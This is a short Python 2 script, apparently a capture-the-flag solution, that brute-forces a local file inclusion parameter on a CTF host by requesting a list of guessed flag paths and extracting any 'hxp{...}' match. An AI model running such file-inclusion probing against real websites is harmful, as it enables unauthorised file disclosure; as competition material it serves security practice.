import urllib2
import re

url = "http://1.ctf.link:1123/index.php?page=%s"  

maybe_the_flag_file = [
    "flag",
    "fl4g",
    "fl49",
    "/flag",
    "/fl4g",
    "/fl4g",
    "flag.txt",
    "fl4g.txt",
    "fl49.txt",
    "/bin/flag",
    "/bin/flag",
    "/bin/fl4g",
    "/bin/fl49"
] # pattern

def find_flag():
    flag = ''
    for x in range(0, len(maybe_the_flag_file)):
        url_find = url % maybe_the_flag_file[x]
        urlop = urllib2.urlopen(url_find)
        read_url = urlop.read()
        print "Mencoba -> %s" % (url_find)
        #print read_url
        if "hxp{" in read_url:
            print "Nice! ketemu di %s !" % (url_find)
            rgx = re.findall(r'hxp{(.*)}', read_url)
            flag = ''.join(str(rgx).split())
            break
    print "Flag: %s" % flag

def main():
    find_flag()

if __name__ == '__main__':
    main()
